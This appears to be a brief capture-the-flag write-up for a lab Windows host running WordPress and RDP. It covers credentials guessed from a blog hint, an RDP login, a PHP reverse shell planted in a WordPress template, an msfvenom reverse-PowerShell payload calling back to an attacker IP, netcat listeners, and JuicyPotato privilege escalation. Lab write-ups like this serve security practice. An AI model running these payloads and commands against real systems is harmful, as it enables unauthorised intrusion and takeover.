@@ -1,0 +1,50 @@
+ip : 10.10.222.54
+Domain : Retroweb
+
+- nmap scan reveals that the ports 80 and 3389 are open
+- 80 is a IIS server and 3389 is RDP access
+- visiting the port 80 reveals a default IIS home page 
+- directory brute force the atrget for hidden directories and found out Retro 
+- visiting retro takes us to a blog
+- directory brute forcing the retro page and found a wp-login page 
+- checking the blog for possible usernames and entry points we found a login page
+- visiting the wp-login page 
+- after thoroughly inspecting the site we found username wade and a hint for his password
+- it says in the blog that wades password is the name of his fav avatar from his fav movie whick is ready player one
+- the name of the avatar is parzival
+
+creds : wade : parzival 
+
+- we try to login to the wordpress with the credential and succeeded
+- we try to login to the machine through RDP with the credentials and succeeded 
+
+xfreerdp /v:10.10.222.54 /u:wade /p:parzival /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
+
+- get the flag
+- we enumerate the machine with RDP access but didnt find any possible attack vectors
+- we still have access to the wordpress site 
+- we can edit the template and add a reverse shell and can get a shell back
+- adding a windows based php reverse shell to the index.php
+- starting a listener with netcat
+
+rlwrap nc -lvnp 1337
+
+- update the template and refresh the page and we get a shell
+- checking for privileges and found that we have impersonate privileges which can be abused
+- download the juicy potato from github
+- create a batch file with msfvenom
+
+msfvenom -p cmd/windows/reverse_powershell lhost=10.8.179.136 lport=9999 -o reverse.bat
+
+- create a temp folder in the victims C drive
+- get the juicy potato executable and the bath file to the victim machine using a python server and certutil
+- start a netcat listener in kali
+
+rlwrap nc -nvlp 9999      
+
+- run the exoploit from the victim machine 
+
+JuicyPotato.exe -t * -p reverse.bat -l 9002
+
+- and we are root 
+- get the flag
